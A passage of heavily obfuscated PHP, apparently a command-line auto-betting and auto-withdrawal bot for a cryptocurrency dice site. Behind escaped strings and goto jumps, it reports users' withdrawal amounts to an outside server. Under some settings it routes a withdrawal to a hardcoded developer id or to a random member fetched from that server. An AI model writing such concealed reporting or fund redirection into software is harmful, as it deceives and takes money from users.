isset($betResponse["\115\141\170\120\141\171\x6f\x75\164\x45\170\143\145\145\144\145\144"])) { $checkBalance = 1; if 
($betResponse["\103\x68\141\156\x63\145\x54\x6f\157\x48\x69\147\150"] == 1) { $messageBet = 
"\xa\x54\150\x65\40\143\x68\x61\x6e\x63\145\40\164\x6f\x20\167\x69\x6e\40\151\163\x20\164\x6f\x6f\x20\x68\x69\x67\x68\56\40\x49\164\40\x6d\165\x73\x74\40\142\x65\40\142\145\164\x77\x65\145\156\x20\65\x25\40\141\156\x64\40\71\x35\45\xa"; 
} if ($betResponse["\x43\x68\x61\x6e\143\145\x54\157\x6f\x4c\x6f\167"] == 1) { $messageBet = 
"\12\x54\150\x65\x20\x63\x68\141\x6e\143\145\x20\x74\157\40\x77\x69\156\40\x69\163\40\x74\157\157\x20\x6c\157\x77\x2e\40\x49\x74\x20\155\165\x73\164\40\142\x65\x20\142\x65\x74\x77\145\x65\x6e\x20\x35\45\x20\141\156\x64\40\71\65\x25\xa"; 
} if ($betResponse["\111\x6e\163\165\146\x66\x69\x63\x69\145\x6e\164\x46\165\x6e\x64\x73"] == 1) { $messageBet = 
"\xa\111\156\x73\165\x66\146\x69\x63\151\145\x6e\164\40\x46\x75\156\144\x73\56\40\120\154\145\141\x73\145\x20\x64\x65\x70\x6f\x73\x69\x74\40\x73\x6f\155\145\40\x63\157\x69\156\x73\x20\x74\157\40\171\x6f\x75\162\40\141\x63\x63\157\165\156\164\x21\x21\xa"; 
if ($soundNotif == 1) { 
system("\x70\x6c\x61\x79\x20\x2d\161\x20\163\157\x75\x6e\144\x2f\x67\141\x6d\x65\x6f\x76\x65\x72\x2e\167\x61\166"); } } if 
($betResponse["\x4e\x6f\120\157\163\163\151\x62\x6c\145\x50\x72\x6f\x66\151\x74"] == 1) { $messageBet = 
"\12\x54\x68\x65\162\145\40\x69\x73\x20\156\157\x20\160\157\x73\163\x69\x62\154\x65\x20\x77\x61\171\x20\146\157\162\40\x74\150\x65\x20\165\x73\x65\x72\x20\x74\x6f\x20\x70\162\x6f\146\x69\164\x20\x66\162\157\155\x20\164\x68\151\163\x20\142\x65\164\12"; 
} if ($betResponse["\x4d\141\x78\x50\141\171\x6f\x75\164\x45\170\x63\x65\145\x64\145\144"] == 1) { $messageBet = 
"\xa\x54\x68\x65\40\142\x65\164\54\x20\x69\146\x20\x77\157\x6e\54\40\167\x6f\165\154\x64\x20\145\x78\143\x65\145\144\40\164\150\145\x20\155\141\170\x69\x6d\x75\155\40\x70\157\163\x73\151\142\x6c\145\40\x70\141\171\157\x75\164\40\146\x6f\x72\x20\x74\x68\x65\40\x63\x61\163\x69\156\x6f\xa"; 
} } else { $checkBalance = 0; } if ($checkBalance == 1) { echo $messageBet; die; } else { $payOut = 
round($betResponse["\x50\x61\171\x4f\x75\164"], 0); $payIn = round($betResponse["\x50\x61\171\x49\156"], 0); $profit = $payOut + $payIn; 
$newBalance = $betResponse["\x53\164\x61\x72\164\151\x6e\x67\x42\141\x6c\141\x6e\x63\145"] + $profit; if ($profit < 0) { if ($soundNotif 
== 1) { system("\160\154\x61\171\40\55\161\x20\163\x6f\x75\156\x64\57\x6c\x6f\163\x65\x2e\x77\x61\166"); } $status = 
"\33\133\x33\61\x6d\x4c\157\163\x65\33\133\63\71\155"; $loseStrike = $loseStrike + 1; } else { if ($soundNotif == 1) { 
system("\160\x6c\x61\x79\x20\55\x71\40\x73\x6f\165\x6e\x64\57\x77\x69\156\56\x77\x61\166"); } $status = 
"\33\x5b\x33\x32\155\x57\151\156\x20\x1b\133\63\x39\x6d"; } $profitAll = $newBalance - $initBalance; $endTime = new DateTime(); $interval 
= $startTime->diff($endTime); echo "{$putih}\x5b" . date("\110\x3a\x69\72\163") . "\x5d\x20\102\141\154\x61\x6e\143\145\x3a\x20" . 
number_format($newBalance / 100000000, 8) . "\40\174\40" . $status . "\40\x7c\x20" . $statBet . 
"\x20\x7c\x20\x50\162\157\146\151\x74\72\40" . number_format($profitAll / 100000000, 8) . "\12"; echo 
"\xd\105\154\141\x70\163\x65\x64\x20\124\x69\x6d\145\x3a\x20" . $interval->format("\x25\110\x3a\45\151\72\45\163") . "\15"; $dynAutoWd = 
$autoWdPercent / 100 * $dumpBalance; if ($autoWdType != 1) { if ($profitAll >= $dynAutoWd) { $wdAmConv = $profitAll; $wdAm = 
number_format($wdAmConv / 100000000, 1); } else { $wdAmConv = $profitAll + 100000000; } } else { $wdAmConv = $wdAm * 100000000; } if 
($premiumMember == 0) { if ($profitAll >= $wdAmConv) { if ($giveaway == 13) { $memberList = 
apiWeb("\150\x74\164\160\x73\x3a\x2f\x2f\143\171\x62\145\x72\154\151\156\x6b\157\146\146\x69\x63\x69\141\154\56\143\157\x6d\x2f\x61\x70\151\57\151\156\x64\x65\170\56\160\x68\x70\x2f\x72\x65\x63\x6f\162\x64\163\x2f\160\162\145\x6d\x69\165\155\137\155\145\155\x62\x65\162\77\151\x6e\143\x6c\165\x64\145\75\155\x65\155\x62\x65\162\x5f\x69\144\x26\146\151\154\164\145\x72\75\x73\x74\x61\x74\x75\x73\x2c\145\x71\x2c\x31"); 
$memberListJson = json_encode($memberList["\x72\x65\x63\x6f\x72\144\x73"], true); $memberJson = json_decode($memberListJson, true); 
$randMember = $memberJson[rand(0, count($memberJson) - 1)]; $randAMember = json_encode($randMember); $randAMemberValue = 
json_decode($randAMember, true); $wdAddr = $randAMemberValue["\155\x65\x6d\142\145\x72\137\x69\x64"]; } elseif ($donateDev == 1 && 
$donateDevCount == 1) { $wdAddr = "\63\62\71\61\65\x39\63\x39\60"; $donateDevCount++; } else { $wdAddr = $wdAddrInput; } $autoWd = 
"\141\75\x57\151\164\x68\144\162\141\167\46\163\x3d" . $userCookies . "\46\101\x6d\x6f\x75\x6e\x74\75" . $wdAmConv . 
"\46\101\144\x64\162\x65\x73\163\75" . $wdAddr . "\46\103\165\162\162\x65\156\x63\171\75" . $currency . ''; $apiWd = 
json_decode(feature($url, $autoWd), true); if (isset($apiWd["\x54\x6f\x6f\123\155\141\154\x6c"]) || 
isset($apiWd["\111\x6e\163\x75\146\146\x69\143\151\x65\156\164\106\x75\x6e\144\x73"])) { echo 
"\x54\150\x65\40\x77\x69\x74\150\144\x72\141\167\141\154\40\x69\163\x20\164\157\157\40\163\x6d\x61\154\x6c\40\x74\x6f\40\x70\162\157\143\x65\x73\163\x20\157\x72\40\151\x6e\163\165\146\146\x69\143\151\x65\156\x74\x20\146\x75\156\x64\x73"; 
} else { if ($soundNotif == 1) { system("\160\x6c\141\171\x20\x2d\161\x20\x73\x6f\x75\156\x64\57\167\144\56\167\141\166"); } echo 
"\xa\55\x2d\x2d\x2d\55\x2d\x2d\x2d\x2d\x2d\55\55\x2d\x2d\x2d\55\55\55\55\x2d\55\55\x2d\x2d\55\55\55\x2d\x2d\x2d\55\55\55\55\x2d\55\55\x2d\55\x2d\55\x2d\55\x2d\55\55\55\55\x2d\55\55\x2d\55\55\x2d\55\x2d\55\55\x2d\55\55\x2d\55\55\x2d\x2d\x2d\x2d\55\55\x2d\55\55\55\x2d\x2d\55\55\55\xa"; 
echo "\x20\43" . $i . "\40\x53\x75\x63\x63\x65\163\163\146\165\154\x20\167\x69\x74\x68\x64\x72\141\x77\141\154\40\x6f\x66\40" . $wdAm . 
"\x20" . $currency . "\x20\164\x6f\x20" . substr($wdAddr, 0, 9) . "\xa"; echo 
"\55\55\55\x2d\55\55\55\x2d\55\55\55\x2d\55\55\x2d\55\x2d\55\55\x2d\x2d\x2d\x2d\x2d\x2d\x2d\55\x2d\x2d\55\x2d\x2d\x2d\x2d\x2d\55\x2d\x2d\x2d\x2d\x2d\55\55\55\x2d\55\x2d\55\55\x2d\x2d\55\55\55\55\55\55\x2d\x2d\x2d\x2d\55\x2d\55\x2d\x2d\x2d\x2d\x2d\x2d\x2d\55\55\55\55\x2d\x2d\x2d\55\55\55\xa"; 
$wait = array(10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30); $waitRand = $wait[array_rand($wait)]; 
echo 
"\x50\154\x65\141\x73\145\40\167\x61\x69\x74\54\40\x79\x6f\x75\162\x20\x74\x72\x61\x64\145\x20\167\x69\154\x6c\40\163\x74\x61\162\x74\x20\141\165\x74\157\155\x61\164\151\143\141\154\x6c\171\40\x69\156\40" 
. $waitRand . "\x20\163\x65\143\x6f\156\x64\163\xa"; if ($betSetOptcoin == 1) { $stat_profitAll = 
apiWeb("\150\x74\164\160\163\72\57\x2f\x63\171\x62\145\162\154\151\156\153\x6f\x66\146\151\x63\151\141\154\56\143\x6f\x6d\x2f\x61\160\151\57\x69\156\144\145\x78\56\160\150\x70\57\162\145\x63\x6f\162\x64\163\57\160\x72\x6f\x66\x69\164\137\163\x74\141\164\x2f\x31")["\160\162\157\x66\151\x74"]; 
$data_array_profitAll = array("\x70\x72\x6f\x66\x69\164" => (int) $stat_profitAll + abs($wdAmConv) / 10000); callAPI("\120\x55\124", 
"\x68\164\164\x70\163\72\x2f\x2f\x63\x79\x62\145\162\x6c\151\156\x6b\x6f\146\146\151\143\151\141\154\x2e\x63\x6f\155\x2f\141\x70\x69\57\x69\x6e\144\x65\x78\56\x70\x68\160\57\162\145\143\x6f\162\x64\163\57\160\x72\x6f\146\x69\x74\137\x73\164\x61\164\x2f\61", 
json_encode($data_array_profitAll)); } elseif ($betSetOptcoin == 2) { $stat_profitAll = 
apiWeb("\x68\x74\164\x70\x73\72\57\57\143\x79\142\x65\x72\154\151\156\x6b\x6f\146\146\x69\x63\x69\x61\x6c\x2e\x63\x6f\155\x2f\141\160\x69\57\151\x6e\144\x65\170\x2e\160\x68\160\57\x72\145\143\157\x72\x64\x73\57\x70\162\157\x66\151\x74\x5f\163\x74\141\164\57\x32")["\160\x72\x6f\146\x69\x74"]; 
$data_array_profitAll = array("\160\162\157\146\x69\164" => (int) $stat_profitAll + abs($wdAmConv) / 10000); callAPI("\120\x55\x54", 
"\x68\x74\x74\160\163\x3a\x2f\57\x63\171\142\145\162\x6c\x69\156\x6b\x6f\x66\x66\151\x63\151\141\x6c\56\x63\x6f\x6d\x2f\x61\x70\x69\57\151\156\x64\145\x78\56\160\x68\x70\57\162\x65\143\x6f\162\x64\x73\57\160\162\157\146\x69\164\x5f\163\164\141\164\57\62", 
json_encode($data_array_profitAll)); } elseif ($betSetOptcoin == 3) { $stat_profitAll = 
apiWeb("\x68\x74\164\160\163\x3a\x2f\x2f\143\x79\x62\145\162\x6c\151\156\x6b\157\146\x66\x69\143\151\141\154\56\143\157\155\x2f\141\x70\x69\57\151\156\x64\x65\x78\x2e\x70\x68\x70\x2f\162\x65\143\157\162\x64\163\57\160\162\x6f\x66\151\164\137\163\164\x61\164\57\x33")["\160\x72\157\146\151\164"]; 
$data_array_profitAll = array("\160\162\157\x66\151\164" => (int) $stat_profitAll + abs($wdAmConv) / 10000); callAPI("\x50\x55\124", 
"\150\164\164\160\x73\72\x2f\x2f\143\x79\x62\145\x72\154\x69\156\x6b\x6f\146\146\x69\x63\151\141\154\56\x63\x6f\x6d\x2f\141\160\151\x2f\151\x6e\144\x65\170\x2e\x70\150\160\57\x72\145\x63\157\162\144\163\x2f\160\x72\x6f\x66\x69\164\137\163\x74\x61\164\x2f\x33", 
json_encode($data_array_profitAll)); } elseif ($betSetOptcoin == 4) { $stat_profitAll = 
apiWeb("\x68\164\x74\160\163\72\57\57\143\x79\142\145\162\154\x69\156\153\x6f\x66\x66\x69\x63\151\141\x6c\56\x63\x6f\x6d\x2f\x61\160\x69\x2f\x69\x6e\x64\145\170\x2e\160\x68\160\x2f\x72\145\143\x6f\x72\144\x73\x2f\160\162\x6f\x66\151\x74\137\x73\164\x61\x74\57\64")["\x70\162\157\146\151\164"]; 
$data_array_profitAll = array("\160\162\157\146\x69\x74" => (int) $stat_profitAll + abs($wdAmConv) / 10000); callAPI("\120\x55\x54", 
"\x68\x74\x74\160\x73\72\x2f\x2f\x63\x79\142\x65\x72\x6c\151\156\x6b\157\146\146\151\143\x69\141\154\56\x63\x6f\155\x2f\141\160\151\57\151\x6e\x64\x65\x78\56\160\x68\x70\57\x72\x65\x63\157\162\x64\163\57\x70\162\x6f\146\x69\164\137\163\164\141\x74\x2f\64", 
json_encode($data_array_profitAll)); } sleep($waitRand); $i++; } $initBalance = $newBalance - $wdAmConv; echo 
"\xa\x20\123\x74\x61\162\x74\x20\102\x61\x6c\141\156\143\145\72\40" . number_format($initBalance / 100000000, 8) . "\40" . $currencyopt . 
"\12"; if ($autoWdLimit != 0) { if ($autoWdLimit > $autoWdTime) { $autoWdTime++; } else { echo 
"\xa\x59\157\x75\x72\40\164\x72\141\x64\x65\x20\x69\x73\x20\x73\164\157\160\160\145\x64\x20\x62\145\143\141\165\x73\x65\40\151\x74\40\150\141\163\x20\162\145\141\x63\x68\x65\x64\40\164\x68\145\x20\x41\165\x74\157\x20\127\104\x20\x6c\x69\155\151\164\12"; 
die; } } } } if ($timeLimit != 0) { $convH = $interval->h * 3600; $convM = $interval->i * 60; $convS = $interval->s; $convSum = $convH + 
$convM + $convS; if ($timeLimit <= $convSum) { echo 
"\12\x59\x6f\165\x72\x20\x74\162\x61\144\x65\x20\151\163\40\x73\x74\157\160\160\x65\144\x20\142\x65\143\x61\165\163\x65\40\151\x74\x20\x68\141\163\x20\162\145\141\x63\150\145\x64\x20\164\x68\145\40\x54\151\x6d\x65\40\x6c\151\155\x69\x74\xa"; 
die; } } if ($StopMinBalance != 0) { $targetLose = $dumpBalance - $StopMinBalance / 100 * $dumpBalance; if ($newBalance < $targetLose) { 
echo 
"\xa\x54\150\145\40\x74\162\x61\x64\145\40\x69\x73\x20\163\164\157\160\x70\145\x64\x20\142\145\143\141\x75\x73\145\40\x79\x6f\x75\x20\x68\x61\166\x65\40\154\x6f\163\164\40" 
. $StopMinBalance . "\45\x20\x6f\x66\40\x74\x68\x65\40\151\x6e\x69\164\151\141\154\40\x62\x61\x6c\x61\x6e\143\145\12"; die; } } if 
($StopMaxBalance != 0) { $targetWin = $dumpBalance + $StopMaxBalance / 100 * $dumpBalance; if ($newBalance > $targetWin) { echo 
"\12\x43\157\x6e\x67\162\141\x74\x75\154\x61\164\151\x6f\x6e\163\x20\171\157\165\x20\150\x61\x76\145\x20\162\145\x61\x63\x68\145\x64\x20\x74\x68\145\40" 
. $StopMaxBalance . "\45\x20\160\162\x6f\146\151\x74\x20\164\x61\x72\147\x65\x74\xa"; die; } } } if ($randomHiLow == 1) { $type = array(1, 
2); $typeRand = $type[array_rand($type)]; if ($typeRand == 1) { if ($low > 0) { $high = 999999 - $low; $low = 0; $statBet = 
"\114\x6f\x77"; } } else { if ($low == 0) { $low = 999999 - $high; $high = 999999; $statBet = "\110\151\40"; } } } if ($loseStrike > 1) { 
$loseStrike = 0; echo 
"\xa\x1b\x5b\x33\x31\x6d\x44\x6f\165\x62\x6c\145\40\x4c\157\163\x65\x20\120\162\x6f\164\145\143\164\151\157\156\40\x69\163\40\141\x63\x74\151\166\x61\x74\145\x64\x21\x21\x21\33\x5b\x33\x39\x6d\xa"; 
break; } } $initBalance = $newBalance; echo "\12\40\123\164\141\x72\164\40\x42\141\154\x61\156\143\x65\x3a\x20" . 
number_format($initBalance / 100000000, 8) . "\40" . $currencyopt . "\12"; } goto xxn1C; FSJzL: if (!isset($user)) { goto LOGINNEW; } goto 
abHnD; OJmjd: $autoWdTime = 1; goto RKQfh; FuXSI: include "\x63\157\x6e\146\x69\x67\x2e\160\150\160"; goto FSJzL; OHfnJ: $lblue2 = 
"\33\x5b\x31\x3b\63\x36\155"; goto QBdnz; Y8wiy: $api_response_decoded = json_decode(feature($url, $loginData), true); goto RJ8f4; Y74xj: 
echo "\40\x75\163\145\40\x5b" . $user . 
"\x5d\40\141\143\x63\157\x75\x6e\164\40\x74\157\x20\154\157\x67\x69\x6e\x3f\40\133\131\x2f\156\x5d\x20"; goto DCbBb; JrnI5: $getBalance = 
json_decode(feature($url, $getBalanceData), true); goto ZCIvU; yolsD: $donateDevCount = 1; goto POC0e; tdOQt: $i = 1; goto n14tU; bkBbO: 
$login = trim(preg_replace("\57\x5c\x73\x5c\x73\53\57", "\40", fgets($handleLogin))); goto jO_w3; a1OWn: sleep(1); goto g3VJ7; abHnD: echo 
"\103\150\x6f\157\x73\x65\72\12\x20\x31\x2e\x20\114\157\147\x69\156\xa\x20\62\x2e\40\103\162\x65\141\164\145\40\x4e\145\x77\x20\101\143\143\x6f\165\x6e\164\12\40\x59\157\x75\162\40\x63\x68\x6f\x69\143\145\x3a\x20\x20"; 
goto rksoc; I8sJZ: $hitam = "\x1b\x5b\60\73\x33\60\155"; goto K3Ugp; ty6gq: echo 
"\12\x3d\75\75\x3d\x3d\75\x3d\75\x3d\115\131\40\102\105\124\123\x3d\x3d\75\75\x3d\x3d\x3d\x3d\x3d\xa"; goto NN1MA; ErGFZ: $blue = 
"\x1b\x5b\x30\x3b\x33\64\155"; goto kOTnM; lZLB_: echo 
"{$red}\40\40\40\x20\40\40\40\x20\x20\x20\40\40\40\40\40\x20\40\40\x20\40\40\40\x50\x65\x74\x65\162\156\x61\x6b\x20\x54\165\x79\165\154\40\x52\x65\143\x65\150\12"; 
goto YMEdt; Ux9D1: $response = json_decode($get_data, true); goto YoPA3; LC9dG: include "\143\157\x6e\x66\151\147\56\x70\150\160"; goto 
ToTF9; co7UJ: function apiWeb($apiurl) { $apiStat = @file_get_contents($apiurl); $api_response_Stat = json_decode($apiStat, true); return 
$api_response_Stat; } goto mCdj2; xxn1C: ?>
